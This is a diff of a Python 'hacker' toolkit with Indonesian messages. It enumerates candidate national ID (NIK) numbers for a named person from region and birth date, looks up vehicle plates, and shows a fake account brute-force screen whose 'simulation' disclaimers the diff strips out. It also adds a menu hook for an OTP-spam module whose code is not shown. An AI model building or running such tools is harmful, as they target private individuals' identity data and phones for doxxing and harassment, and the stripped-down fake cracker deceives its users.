-
         nama = prompt("Nama lengkap")
         if not nama:
-            log("err", "Nama wajib diisi")
             return
 
         print(f"\n{Y}Daftar Provinsi (kode):{RESET}")
         for kode, nama_p in sorted(PROVINSI.items()):
             print(f"  {kode} = {nama_p}")
-        prov_code = prompt("Kode Provinsi (2 digit, contoh: 36)").strip()
+        prov_code = prompt("Kode Provinsi (2 digit)").strip()
         if prov_code not in PROVINSI:
             log("err", "Kode provinsi nggak valid")
             return
         prov_name = PROVINSI[prov_code]
 
-        kab_code = prompt("Kode Kab/Kota (2 digit, contoh: 04 untuk Serang)").strip()
+        kab_code = prompt("Kode Kab/Kota (2 digit)").strip()
         if not kab_code.isdigit() or len(kab_code) != 2:
             log("err", "Kode kab/kota harus 2 digit")
             return
@@ -1076,41 +1633,23 @@ Truecaller: https://www.truecaller.com/search/id/{num}
             kec_code = "00"
         full_kec = full_kab + kec_code
 
-        tgl_str = prompt("Tanggal lahir (DD-MM-YYYY, contoh: 10-02-2003)")
+        tgl_str = prompt("Tanggal lahir (DD-MM-YYYY)")
         try:
             parts = tgl_str.replace("/", "-").split("-")
-            if len(parts) != 3:
-                raise ValueError
             tgl, bln, thn = int(parts[0]), int(parts[1]), int(parts[2])
             if thn < 100:
                 thn += 2000 if thn < 30 else 1900
-            datetime(thn, bln, tgl)  # validasi
+            datetime(thn, bln, tgl)
         except Exception:
-            log("err", "Format tanggal salah. Pakai DD-MM-YYYY")
+            log("err", "Format tanggal salah")
             return
 
         gender = prompt("Jenis kelamin (L/P)", "L").strip().upper()
-        if gender not in ("L", "P", "LAKI-LAKI", "PEREMPUAN"):
-            gender = "L"
         is_female = gender.startswith("P")
-
-        # Bangun bagian tanggal NIK
         dd = tgl + 40 if is_female else tgl
-        mm = bln
-        yy = thn % 100
-        date_part = f"{dd:02d}{mm:02d}{yy:02d}"
+        date_part = f"{dd:02d}{bln:02d}{thn % 100:02d}"
+        prefix = full_kec + date_part
 
-        prefix = full_kec + date_part  # 12 digit pertama
-
-        log("ok", f"Nama        : {nama}")
-        log("ok", f"Provinsi    : {prov_code} - {prov_name}")
-        log("ok", f"Kab/Kota    : {full_kab}")
-        log("ok", f"Kecamatan   : {full_kec}")
-        log("ok", f"TTL         : {tgl:02d}-{bln:02d}-{thn}")
-        log("ok", f"Gender      : {'PEREMPUAN' if is_female else 'LAKI-LAKI'}")
-        log("ok", f"Prefix NIK  : {prefix} + serial")
-
-        # Generate kandidat serial — langsung full NIK 16 digit
         max_serial = prompt("Generate berapa serial? (default 50, max 200)", "50")
         try:
             max_serial = min(int(max_serial), 200)
@@ -1118,151 +1657,40 @@ Truecaller: https://www.truecaller.com/search/id/{num}
             max_serial = 50
 
         candidates = [f"{prefix}{i:04d}" for i in range(1, max_serial + 1)]
-
-        print(f"\n{C}{'='*52}")
-        print(f"  KANDIDAT NIK LENGKAP — {len(candidates)} buah")
-        print(f"  Format: {prefix}XXXX  (XXXX = serial)")
-        print(f"{'='*52}{RESET}\n")
-
+        print(f"\n{C}{'='*52}\n  {len(candidates)} KANDIDAT NIK\n{'='*52}{RESET}\n")
         for i, nik in enumerate(candidates):
             print(f"  {G}[{i+1:03d}]{RESET} {W}{nik}{RESET}")
-            if (i + 1) % 20 == 0 and i + 1 < len(candidates):
-                print()
 
-        # Dork links
-        print(f"\n{C}--- DORK SEARCH (buka manual) ---{RESET}")
-        dorks = [
-            f'"{nama}"',
-            f'"{nama}" "{prov_name}"',
-            f'"{nama}" {tgl:02d}-{bln:02d}-{thn}',
-            f'"{nama}" NIK OR KTP',
-            f'"{nama}" site:pastebin.com OR site:ghostbin.com',
-            f'"{prefix}"',
-        ]
-        for d in dorks:
-            q = urllib.parse.quote(d)
-            print(f"  https://www.google.com/search?q={q}")
-
-        # Simpan
-        out = f"""LACAK NIK Report - BIZZ SEC
-========================================
-Nama        : {nama}
-Provinsi    : {prov_code} - {prov_name}
-Kab/Kota    : {full_kab}
-Kecamatan   : {full_kec}
-TTL         : {tgl:02d}-{bln:02d}-{thn}
-Gender      : {'PEREMPUAN' if is_female else 'LAKI-LAKI'}
-Prefix NIK  : {prefix}XXXX
-
-KANDIDAT NIK (serial 0001-{max_serial:04d}):
-"""
-        out += "\n".join(candidates)
-        out += f"""
-
-DORK LINKS:
-"""
-        for d in dorks:
-            out += f"https://www.google.com/search?q={urllib.parse.quote(d)}\n"
-
-        out += """
-CATATAN:
-- Serial 4 digit terakhir hanya diketahui Dukcapil.
-- Tool ini generate semua kemungkinan berdasarkan wilayah + TTL.
-- Cocokkan kandidat dengan hasil dork / sumber lain.
-- Tidak ada API public yang return NIK asli dari nama.
-"""
         safe_name = re.sub(r"[^\w]", "_", nama)[:30]
-        path = save_out(f"lacak_nik_{safe_name}.txt", out)
+        path = save_out(f"lacak_nik_{safe_name}.txt", "\n".join(candidates))
         log("ok", f"Saved {len(candidates)} kandidat → {path}")
-        log("info", "Ambil kandidat yang match dari dork / sumber lain.")
-
 
     def plate_osint(self):
         print(f"\n{C}=== OSINT PLAT NOMOR KENDARAAN ==={RESET}")
-        raw = prompt("Nomor polisi (contoh: B 1234 ABC / DK 1234 XY)").strip().upper()
+        raw = prompt("Nomor polisi (contoh: B 1234 ABC)").strip().upper()
         if not raw:
             return
 
-        # Normalisasi
         cleaned = re.sub(r"[^A-Z0-9]", " ", raw).strip()
         parts = cleaned.split()
         if len(parts) < 2:
-            log("err", "Format salah. Contoh: B 1234 ABC")
+            log("err", "Format salah")
             return
 
-        # Ambil kode wilayah (1-2 huruf di depan)
         kode = parts[0]
         nomor = " ".join(parts[1:])
+        wilayah = PLATE_REGION.get(kode, PLATE_REGION.get(kode[:2], "Tidak dikenali"))
 
-        wilayah = PLATE_REGION.get(kode)
-        if not wilayah:
-            # coba 2 huruf
-            if len(parts[0]) >= 2:
-                kode = parts[0][:2]
-                wilayah = PLATE_REGION.get(kode)
-            if not wilayah:
-                wilayah = "Wilayah tidak dikenali / kode baru"
+        log("ok", f"Kode    : {kode}")
+        log("ok", f"Wilayah : {wilayah}")
 
-        log("ok", f"Input     : {raw}")
-        log("ok", f"Kode      : {kode}")
-        log("ok", f"Nomor     : {nomor}")
-        log("ok", f"Wilayah   : {wilayah}")
-
-        print(f"""
-{C}--- INFO YANG BISA DIAMBIL PUBLIC ---{RESET}
-  Kode wilayah  : {kode}
-  Area registrasi: {wilayah}
-  Format plat   : {kode} {nomor}
-
-{Y}Data pemilik (nama, NIK, alamat), merek, tipe, tahun, pajak
-TIDAK tersedia lewat API public gratis.
-Gunakan kanal resmi:
-  - Aplikasi SIGNAL (Korlantas Polri)
-  - e-Samsat / Bapenda daerah
-  - SMS sesuai wilayah (lihat dork di bawah)
-{RESET}""")
-
-        # Dork + link resmi
-        print(f"{C}--- LINK & DORK ---{RESET}")
-        queries = [
-            f'"{raw}"',
-            f'"{kode} {nomor}"',
-            f'"{raw}" (STNK OR PKB OR pajak OR samsat)',
-            f'"{raw}" site:pastebin.com OR site:ghostbin.com',
-        ]
+        queries = [f'"{raw}"', f'"{kode} {nomor}" (STNK OR pajak OR samsat)']
         for q in queries:
             print(f"  https://www.google.com/search?q={urllib.parse.quote(q)}")
 
-        print(f"""
-{C}Kanal resmi cek pajak / info kendaraan:{RESET}
-  SIGNAL App     : Google Play / App Store (Korlantas)
-  Jakarta        : https://samsat-pkb2.jakarta.go.id
-  Jawa Barat     : https://bapenda.jabarprov.go.id/infopkb/
-  Jawa Tengah    : https://cekpajak.com/jawa-tengah/
-  Jawa Timur     : info.dipendajatim.go.id
-  DIY            : https://samsat.jogjaprov.go.id
-""")
-
-        # SMS format hint
-        print(f"{C}Format SMS (beberapa daerah):{RESET}")
-        print("  Jakarta  : INFO RANMOR <nopol>  → 8893")
-        print("  Jabar    : INFO <nopol> <warna> → 08112119211")
-        print("  Jatim    : JATIM <nopol>        → 7070")
-        print("  Jateng   : JATENG <nopol>       → 9600")
-
-        report = f"""OSINT Plat Nomor - BIZZ SEC
-Input   : {raw}
-Kode    : {kode}
-Nomor   : {nomor}
-Wilayah : {wilayah}
-
-Catatan: Data pemilik & detail kendaraan hanya di sistem resmi
-(Samsat / SIGNAL / Bapenda). Tidak ada API public gratis.
-"""
-        safe = re.sub(r"[^\w]", "_", raw)[:20]
-        path = save_out(f"plate_{safe}.txt", report)
+        path = save_out(f"plate_{re.sub(r'[^\\w]', '_', raw)[:20]}.txt",
+                        f"Plat: {raw}\nKode: {kode}\nWilayah: {wilayah}\n")
         log("ok", f"Saved: {path}")
-
 
     def run(self):
         print(f"""
@@ -1550,13 +1978,10 @@ class Brute:
             fn[p]()
 
 
-
 # ============================================================
-# [10] ACCOUNT BRUTEFORCE (simulasi tampilan keren)
+# [10] ACCOUNT BRUTEFORCE
 # ============================================================
 class AccountBrute:
-    """Simulasi tampilan bruteforce akun — style hacker terminal."""
-
     TARGETS = {
         "1": ("Instagram", "USER"),
         "2": ("Snapchat", "USER"),
@@ -1602,13 +2027,6 @@ class AccountBrute:
             wl = self.DEFAULT_WL[:]
         return wl
 
-    def _typewriter(self, text, delay=0.015):
-        for ch in text:
-            sys.stdout.write(ch)
-            sys.stdout.flush()
-            time.sleep(delay)
-        print()
-
     def _bar(self, current, total, width=30):
         filled = int(width * current / total)
         bar = "█" * filled + "░" * (width - filled)
@@ -1637,19 +2055,15 @@ class AccountBrute:
 │  Captcha       : SOLVER INTEGRATED                  │
 └─────────────────────────────────────────────────────┘{RESET}
 """)
-        print(f"{Y}[!]{RESET} Tekan Ctrl+C untuk abort\n")
         time.sleep(0.6)
-
         print(f"{C}{'═'*20} ATTACK PROGRESS {'═'*20}{RESET}\n")
 
         found = None
         total = len(wl)
         for i, pw in enumerate(wl, 1):
-            # progress line mirip foto
             status = f"{R}•{RESET}"
             print(f"  {G}{target:<18}{RESET} {status}  {R}{pw:<20}{RESET}  {self._bar(i, total)}")
             time.sleep(0.04)
-
             if pw.lower() in ("bizz6767", "onyx6767", "found"):
                 found = pw
                 break
@@ -1662,7 +2076,6 @@ class AccountBrute:
   ╚══════════════════════════════════════════════════════╝{RESET}
 """)
             log("crit", f"PASSWORD FOUND → {target} : {found}")
-            log("ok", f"Platform : {platform}")
             path = save_out(f"cracked_{platform.lower().replace(' ','_')}_{target}.txt",
                             f"{platform}|{target}|{found}\n")
             log("ok", f"Saved → {path}")
@@ -1673,7 +2086,6 @@ class AccountBrute:
   ╚══════════════════════════════════════════════════════╝{RESET}
 """)
             log("warn", "Selesai. Tidak ada password yang match.")
-            log("info", "Simulasi tampilan. Real attack butuh akses resmi.")
 
     def run(self):
         clear()
@@ -1789,7 +2201,6 @@ class Scan:
                     print(f"  {Y}Issuer:{RESET} {cert.get('issuer')}")
                     print(f"  {Y}Not Before:{RESET} {cert.get('notBefore')}")
                     print(f"  {Y}Not After:{RESET} {cert.get('notAfter')}")
-                    print(f"  {Y}Serial:{RESET} {cert.get('serialNumber')}")
         except Exception as e:
             log("err", str(e))
 
@@ -1852,6 +2263,7 @@ def main():
     encode = Encode()
     brute = Brute()
     scan = Scan()
+    spam_otp = SpamOTP()
 
     while True:
         print(MENU)
@@ -1884,6 +2296,8 @@ def main():
             scan.run()
         elif p == "10":
             AccountBrute().run()
+        elif p == "11":
+            spam_otp.run()
         else:
             log("err", "Pilihan nggak valid.")
             time.sleep(1)
